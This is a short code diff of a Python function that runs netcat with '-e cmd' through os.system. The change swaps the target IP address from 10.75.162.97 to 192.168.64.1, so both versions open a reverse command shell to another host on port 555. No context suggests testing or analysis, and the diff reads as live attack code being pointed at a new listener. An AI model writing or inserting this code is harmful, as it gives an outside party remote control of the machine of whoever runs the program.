@@ -1,3 +1,3 @@
 import os
 def run():
-    os.system('nc 10.75.162.97 555 -e cmd')
+    os.system('nc 192.168.64.1 555 -e cmd')
